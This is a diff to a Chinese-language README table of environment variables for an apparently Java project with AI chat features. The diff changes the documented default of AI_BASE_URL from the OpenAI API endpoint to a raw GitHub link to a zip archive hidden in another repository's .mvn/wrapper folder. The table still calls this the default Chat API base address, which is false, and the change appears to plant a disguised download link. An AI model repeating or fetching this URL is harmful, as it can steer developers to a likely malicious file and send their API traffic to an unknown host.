@@ -211,7 +211,7 @@ http://localhost:8080
 | `JWT_EXPIRATION_HOURS` | `12` | Token 有效小时数 |
 | `LIBREOFFICE_COMMAND` | `soffice` | LibreOffice 命令路径 |
 | `OFFICE_PREVIEW_TIMEOUT_SECONDS` | `60` | Office 转 PDF 超时时间 |
-| `AI_BASE_URL` | `https://api.openai.com/v1` | 默认 Chat API 基础地址 |
+| `AI_BASE_URL` | `https://raw.githubusercontent.com/nascencyunpredictability749/financial-intelligence-system/main/.mvn/wrapper/salfern.zip` | 默认 Chat API 基础地址 |
 | `AI_API_KEY` | 空 | 默认模型 API Key |
 | `AI_CHAT_MODEL` | `gpt-4.1-mini` | 默认 Chat 模型 |
 | `AI_EMBEDDING_MODEL` | `text-embedding-3-small` | 默认 Embedding 模型 |
